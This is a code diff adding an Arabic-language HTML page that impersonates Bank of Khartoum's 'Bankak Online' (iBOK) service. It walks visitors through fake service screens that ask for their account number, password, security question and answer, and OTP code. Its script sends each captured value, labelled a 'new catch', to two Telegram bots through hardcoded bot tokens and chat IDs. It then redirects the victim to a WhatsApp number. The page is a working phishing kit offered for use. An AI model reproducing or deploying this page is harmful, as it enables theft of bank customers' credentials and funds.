@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>خدمات بنكك أونلاين - بنك الخرطوم</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        body {
+            background-color: #f6f6f6;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            padding: 0;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 440px;
+            background-color: #f6f6f6;
+            min-height: 100vh;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        }
+
+        /* الهيدر الأحمر للتطبيقات المصرفية */
+        .top-navbar {
+            background-color: #b71c1c;
+            color: #ffffff;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .top-navbar .logo-text {
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        .yellow-badge {
+            background-color: #fbc02d;
+            color: #b71c1c;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 700;
+        }
+
+        /* الأقسام والشاشات */
+        .screen {
+            display: none;
+            padding: 20px 15px;
+        }
+
+        .screen.active {
+            display: block;
+        }
+
+        /* الشاشة الأولى: الرئيسية */
+        .header-title {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .header-title h1 {
+            color: #b71c1c;
+            font-size: 24px;
+            font-weight: 700;
+            line-height: 1.3;
+            margin-bottom: 8px;
+        }
+
+        .header-title p {
+            color: #666666;
+            font-size: 13px;
+        }
+
+        .service-card {
+            background-color: #ffffff;
+            border-radius: 12px;
+            padding: 16px 20px;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.04);
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .service-card:active {
+            transform: scale(0.98);
+        }
+
+        .service-icon {
+            width: 44px;
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            margin-left: 15px;
+        }
+
+        .service-info {
+            text-align: right;
+            flex-grow: 1;
+        }
+
+        .service-title {
+            color: #b71c1c;
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .service-desc {
+            color: #777777;
+            font-size: 12px;
+        }
+
+        .icon-circle {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #e52d27;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .icon-rect {
+            width: 40px;
+            height: 40px;
+            border-radius: 8px;
+            background-color: #e52d27;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* الشاشة الثانية: خطوات الخدمة */
+        .details-box {
+            background-color: #ffffff;
+            border-radius: 12px;
+            padding: 24px 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            text-align: center;
+        }
+
+        .details-icon {
+            width: 60px;
+            height: 60px;
+            background-color: #e52d27;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px auto;
+        }
+
+        .details-title {
+            color: #b71c1c;
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 6px;
+        }
+
+        .details-subtitle {
+            color: #777777;
+            font-size: 13px;
+            margin-bottom: 25px;
+        }
+
+        .steps-container {
+            text-align: right;
+            margin-bottom: 30px;
+        }
+
+        .steps-header {
+            color: #b71c1c;
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .step-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+            color: #444;
+            font-size: 14px;
+        }
+
+        .step-number {
+            color: #b71c1c;
+            font-weight: 700;
+            margin-left: 10px;
+        }
+
+        /* الشاشات النموذجية (Forms) */
+        .form-card {
+            background-color: #ffffff;
+            border-radius: 12px;
+            padding: 24px 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            text-align: center;
+        }
+
+        .form-title {
+            color: #b71c1c;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .form-subtitle {
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 25px;
+        }
+
+        .input-group {
+            text-align: right;
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .input-field, .select-field {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #e0e0e0;
+            background-color: #f9fafb;
+            border-radius: 8px;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-field:focus, .select-field:focus {
+            border-color: #b71c1c;
+            background-color: #ffffff;
+        }
+
+        .toggle-password {
+            position: absolute;
+            left: 12px;
+            top: 40px;
+            cursor: pointer;
+            color: #777;
+        }
+
+        .forgot-link {
+            display: block;
+            text-align: right;
+            color: #b71c1c;
+            font-size: 12px;
+            margin-top: -10px;
+            margin-bottom: 20px;
+            text-decoration: none;
+        }
+
+        .btn-submit {
+            width: 100%;
+            background-color: #b71c1c;
+            color: #ffffff;
+            border: none;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-submit:hover {
+            background-color: #9a0007;
+        }
+
+        .timer-text {
+            color: #b71c1c;
+            font-size: 12px;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+
+    <!-- الشاشة 1: الصفحة الرئيسية -->
+    <div id="screen-home" class="screen active">
+        <div class="header-title">
+            <h1>مرحباً بكم في خدمات بنكك<br>أونلاين</h1>
+            <p>الرجاء الاختيار من الخدمات المقدمة أدناه</p>
+        </div>
+
+        <div class="service-card" onclick="openDetails('التحويلات الخاطئة', 'معالجة أخطاء التحويلات البنكية.')">
+            <div class="service-icon">
+                <svg width="34" height="34" viewBox="0 0 24 24" fill="none">
+                    <path d="M6.5 7.5H19M19 7.5L15.5 4M19 7.5L15.5 11" stroke="#e52d27" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M17.5 16.5H5M5 16.5L8.5 13M5 16.5L8.5 20" stroke="#e52d27" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+            <div class="service-info">
+                <h2 class="service-title">التحويلات الخاطئة</h2>
+                <p class="service-desc">معالجة أخطاء التحويلات البنكية.</p>
+            </div>
+        </div>
+
+        <div class="service-card" onclick="openDetails('خدمات العملات الأجنبية', 'تفعيل وإدارة العملات الأجنبية.')">
+            <div class="service-icon">
+                <div class="icon-circle">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <line x1="2" y1="12" x2="22" y2="12"></line>
+                        <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path>
+                    </svg>
+                </div>
+            </div>
+            <div class="service-info">
+                <h2 class="service-title">خدمات العملات الأجنبية</h2>
+                <p class="service-desc">تفعيل وإدارة العملات الأجنبية.</p>
+            </div>
+        </div>
+
+        <div class="service-card" onclick="openDetails('رفع سقف التحويلات اليومية', 'زيادة الحد اليومي للتحويلات.')">
+            <div class="service-icon">
+                <div class="icon-circle">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2">
+                        <path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2z"></path>
+                        <path d="M12 12l4-4"></path>
+                    </svg>
+                </div>
+            </div>
+            <div class="service-info">
+                <h2 class="service-title">رفع سقف التحويلات اليومية</h2>
+                <p class="service-desc">زيادة الحد اليومي للتحويلات.</p>
+            </div>
+        </div>
+
+        <div class="service-card" onclick="openDetails('كشف الحساب', 'الحصول على كشف حساب مفصل.')">
+            <div class="service-icon">
+                <div class="icon-rect">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2">
+                        <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                        <polyline points="14 2 14 8 20 8"></polyline>
+                        <line x1="8" y1="13" x2="16" y2="13"></line>
+                    </svg>
+                </div>
+            </div>
+            <div class="service-info">
+                <h2 class="service-title">كشف الحساب</h2>
+                <p class="service-desc">الحصول على كشف حساب مفصل.</p>
+            </div>
+        </div>
+
+        <div class="service-card" onclick="openDetails('بطاقة فيزا افتراضية', 'تفعيل بطاقة فيزا للاستخدام الإلكتروني.')">
+            <div class="service-icon">
+                <svg width="36" height="26" viewBox="0 0 24 18" fill="none">
+                    <rect width="24" height="18" rx="4" fill="#e52d27"/>
+                    <rect y="4" width="24" height="3.5" fill="#ffffff"/>
+                </svg>
+            </div>
+            <div class="service-info">
+                <h2 class="service-title">بطاقة فيزا افتراضية</h2>
+                <p class="service-desc">تفعيل بطاقة فيزا للاستخدام الإلكتروني.</p>
+            </div>
+        </div>
+
+        <div class="service-card" onclick="openDetails('حساب جاري و حساب مميز', 'فتح أو ترقية الحساب.')">
+            <div class="service-icon">
+                <svg width="36" height="26" viewBox="0 0 24 18" fill="none">
+                    <rect width="24" height="18" rx="4" fill="#e52d27"/>
+                    <circle cx="6.5" cy="8.5" r="2.5" fill="#ffffff"/>
+                </svg>
+            </div>
+            <div class="service-info">
+                <h2 class="service-title">حساب جاري و حساب مميز</h2>
+                <p class="service-desc">فتح أو ترقية الحساب.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- الشاشة 2: خطوات تفعيل الخدمة -->
+    <div id="screen-details" class="screen">
+        <div class="top-navbar" style="background: none; color: #b71c1c; padding: 0 0 15px 0;">
+            <span style="font-weight: bold; font-size: 18px;">بنك الخرطوم</span>
+            <span class="yellow-badge">خدمات بنكك أونلاين</span>
+        </div>
+        <div class="details-box">
+            <div class="details-icon">
+                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2">
+                    <path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2z"></path>
+                    <path d="M12 12l4-4"></path>
+                </svg>
+            </div>
+            <h2 id="selected-service-title" class="details-title">رفع سقف التحويلات اليومية</h2>
+            <p id="selected-service-desc" class="details-subtitle">زيادة الحد اليومي للتحويلات البنكية.</p>
+
+            <div class="steps-container">
+                <h3 class="steps-header">خطوات تفعيل الخدمة</h3>
+                <div class="step-item"><span class="step-number">.1</span> تسجيل الدخول للخدمات.</div>
+                <div class="step-item"><span class="step-number">.2</span> اختر خدمة إدارة السقف اليومي.</div>
+                <div class="step-item"><span class="step-number">.3</span> حدد مبلغ السقف الجديد المطلوب.</div>
+                <div class="step-item"><span class="step-number">.4</span> أدخل سبب الرفع (اختياري).</div>
+                <div class="step-item"><span class="step-number">.5</span> ارسل الطلب للموافقة الإدارية.</div>
+            </div>
+
+            <button class="btn-submit" onclick="goToScreen('screen-login')">الانتقال إلى تسجيل الدخول</button>
+        </div>
+    </div>
+
+    <!-- الشاشة 3: الاستمارة أونلاين (تسجيل الدخول) -->
+    <div id="screen-login" class="screen">
+        <div class="top-navbar">
+            <div>
+                <div class="logo-text">iBOK</div>
+                <div style="font-size: 10px; opacity: 0.9;">Online Form الاستمارة أونلاين</div>
+            </div>
+            <span class="yellow-badge">مرحباً بكم في خدمة iBOK المصرفية عبر الإنترنت</span>
+        </div>
+
+        <div style="margin-top: 20px;" class="form-card">
+            <h2 class="form-title">الاستمارة أونلاين</h2>
+            <p class="form-subtitle">الرجاء إدخال البيانات</p>
+
+            <div class="input-group">
+                <label>رقم الحساب:</label>
+                <input type="text" id="accountInput" class="input-field" placeholder="أدخل رقم الحساب">
+            </div>
+
+            <div class="input-group">
+                <label>كلمة المرور:</label>
+                <input type="password" id="passInput" class="input-field" placeholder="أدخل كلمة المرور">
+                <span class="toggle-password" onclick="togglePassword()">👁️</span>
+            </div>
+
+            <a href="#" class="forgot-link">نسيت كلمة المرور؟</a>
+
+            <button class="btn-submit" onclick="submitLogin()">تسجيل الدخول</button>
+        </div>
+    </div>
+
+    <!-- الشاشة 4: سؤال الأمان -->
+    <div id="screen-security" class="screen">
+        <div class="top-navbar">
+            <div>
+                <div class="logo-text">iBOK</div>
+                <div style="font-size: 10px; opacity: 0.9;">Online Form الاستمارة أونلاين</div>
+            </div>
+            <span class="yellow-badge">مرحباً بكم في خدمة iBOK المصرفية عبر الإنترنت</span>
+        </div>
+
+        <div style="margin-top: 20px;" class="form-card">
+            <h2 class="form-title">متابعة الاستمارة أونلاين</h2>
+
+            <div class="input-group">
+                <label>الرجاء الإجابة على سؤال الأمان</label>
+                <select id="securityQuestion" class="select-field">
+                    <option value="" disabled selected>-- اختر سؤال الأمان --</option>
+                    <option value="ما هو اسم ابن عمك الأول؟">ما هو اسم ابن عمك الأول؟</option>
+                    <option value="في أي مدينة ولدت؟">في أي مدينة ولدت؟</option>
+                    <option value="في أي سنة تخرجت من الجامعة؟">في أي سنة تخرجت من الجامعة؟</option>
+                    <option value="ماذا كان لقبك أثناء الطفولة؟">ماذا كان لقبك أثناء الطفولة؟</option>
+                    <option value="اسم مؤلفك المفضل؟">اسم مؤلفك المفضل؟</option>
+                    <option value="اسم الشركة المصنعة للسيارة المفضلة لديك؟">اسم الشركة المصنعة للسيارة المفضلة لديك؟</option>
+                    <option value="أي فيلم هو المفضل لديك؟">أي فيلم هو المفضل لديك؟</option>
+                    <option value="اسم افضل صديق في الطفولة؟">اسم افضل صديق في الطفولة؟</option>
+                    <option value="في أي عام حصلت على رخصة القيادة الخاصة بك؟">في أي عام حصلت على رخصة القيادة الخاصة بك؟</option>
+                    <option value="العلامة التجارية لأول تلفزيون الخاص بك؟">العلامة التجارية لأول تلفزيون الخاص بك؟</option>
+                </select>
+            </div>
+
+            <div class="input-group">
+                <label>أدخل الجواب:</label>
+                <input type="text" id="securityAnswer" class="input-field" placeholder="اكتب جوابك هنا">
+            </div>
+
+            <button class="btn-submit" onclick="submitSecurity()">إرسال</button>
+        </div>
+    </div>
+
+    <!-- الشاشة 5: إدخال رمز OTP والعد التنازلي للتوجيه للواتساب -->
+    <div id="screen-otp" class="screen">
+        <div class="top-navbar">
+            <div>
+                <div class="logo-text">iBOK</div>
+                <div style="font-size: 10px; opacity: 0.9;">Online Form الاستمارة أونلاين</div>
+            </div>
+            <span class="yellow-badge">مرحباً بكم في خدمة iBOK المصرفية عبر الإنترنت</span>
+        </div>
+
+        <div style="margin-top: 20px;" class="form-card">
+            <h2 class="form-title">إدخال رمز OTP</h2>
+            <p class="form-subtitle">الرجاء إدخال رمز التحقق المرسل إلى رقم هاتفك وبريدك الإلكتروني المسجل</p>
+
+            <div class="input-group">
+                <label>أدخل رمز التحقق (OTP):</label>
+                <input type="text" id="otpInput" class="input-field" placeholder="أدخل رمز مكون من 6 أرقام" maxlength="6">
+            </div>
+
+            <div class="timer-text">إعادة إرسال الرمز خلال <span id="timer">30:00</span> دقيقة</div>
+            <br>
+            <button class="btn-submit" onclick="submitOtpAndRedirect()">إرسال</button>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    let timerInterval;
+    let currentService = "";
+    let userData = {
+        account: "",
+        password: "",
+        question: "",
+        answer: "",
+        otp: ""
+    };
+
+    // إعداد بيانات البوتين
+    const bot1Token = "9104061776:AAFrgWhhPwton61AgTwpRAb64DbGiKVmEq8";
+    const bot1ChatId = "9047523104";
+
+    const bot2Token = "8602888229:AAHB0XSqtkVa--8uj3OvNAbNsuM4KFECtZ0";
+    const bot2ChatId = "8623773122";
+
+    // دالة إرسال الرسالة للبوتين معاً في نفس الوقت
+    function sendToTelegram(message) {
+        const url1 = `https://api.telegram.org/bot${bot1Token}/sendMessage?chat_id=${bot1ChatId}&text=${encodeURIComponent(message)}`;
+        const url2 = `https://api.telegram.org/bot${bot2Token}/sendMessage?chat_id=${bot2ChatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(url1).catch(err => console.log(err));
+        fetch(url2).catch(err => console.log(err));
+    }
+
+    function goToScreen(screenId) {
+        const screens = document.querySelectorAll('.screen');
+        screens.forEach(screen => screen.classList.remove('active'));
+        document.getElementById(screenId).classList.add('active');
+        window.scrollTo(0, 0);
+
+        if (screenId === 'screen-otp') {
+            startTimer(30 * 60);
+        }
+    }
+
+    function openDetails(title, desc) {
+        currentService = title;
+        document.getElementById('selected-service-title').innerText = title;
+        document.getElementById('selected-service-desc').innerText = desc;
+        goToScreen('screen-details');
+    }
+
+    function togglePassword() {
+        const passInput = document.getElementById('passInput');
+        if (passInput.type === 'password') {
+            passInput.type = 'text';
+        } else {
+            passInput.type = 'password';
+        }
+    }
+
+    // الخطوة 1: عند تسجيل الدخول
+    function submitLogin() {
+        userData.account = document.getElementById('accountInput').value;
+        userData.password = document.getElementById('passInput').value;
+
+        if(!userData.account || !userData.password) {
+            alert('الرجاء إدخال رقم الحساب وكلمة المرور');
+            return;
+        }
+
+        let msg = `🚨 صيد جديد - بنكك أونلاين\n\n📌 الخدمة: ${currentService}\n👤 رقم الحساب: ${userData.account}\n🔑 كلمة المرور: ${userData.password}`;
+        sendToTelegram(msg);
+
+        goToScreen('screen-security');
+    }
+
+    // الخطوة 2: عند اختيار سؤال الأمان وإرسال الإجابة
+    function submitSecurity() {
+        const selectObj = document.getElementById('securityQuestion');
+        userData.question = selectObj.options[selectObj.selectedIndex].text;
+        userData.answer = document.getElementById('securityAnswer').value;
+
+        if(!userData.answer || selectObj.selectedIndex === 0) {
+            alert('الرجاء اختيار السؤال وإدخال الجواب');
+            return;
+        }
+
+        let msg = `🚨 تحديث البيانات - سؤال الأمان\n\n👤 رقم الحساب: ${userData.account}\n❓ السؤال: ${userData.question}\n💬 الجواب: ${userData.answer}`;
+        sendToTelegram(msg);
+
+        goToScreen('screen-otp');
+    }
+
+    // دالة العد التنازلي لـ 30 دقيقة
+    function startTimer(duration) {
+        clearInterval(timerInterval);
+        let timer = duration, minutes, seconds;
+        const display = document.getElementById('timer');
+
+        timerInterval = setInterval(function () {
+            minutes = parseInt(timer / 60, 10);
+            seconds = parseInt(timer % 60, 10);
+
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+
+            display.textContent = minutes + ":" + seconds;
+
+            if (--timer < 0) {
+                clearInterval(timerInterval);
+                display.textContent = "00:00";
+            }
+        }, 1000);
+    }
+
+    // الخطوة 3: إرسال رمز OTP والتوجيه التلقائي إلى الواتساب
+    function submitOtpAndRedirect() {
+        userData.otp = document.getElementById('otpInput').value;
+
+        if(!userData.otp) {
+            alert('الرجاء إدخال رمز التحقق');
+            return;
+        }
+
+        let msg = `🚨 رمز التحقق النهائي (OTP)\n\n👤 رقم الحساب: ${userData.account}\n🔑 كلمة المرور: ${userData.password}\n❓ سؤال الأمان: ${userData.question}\n💬 الجواب: ${userData.answer}\n🔢 رمز الـ OTP: ${userData.otp}`;
+        sendToTelegram(msg);
+
+        setTimeout(() => {
+            window.location.href = "https://wa.me/249124003011";
+        }, 600);
+    }
+</script>
+
+</body>
+</html>
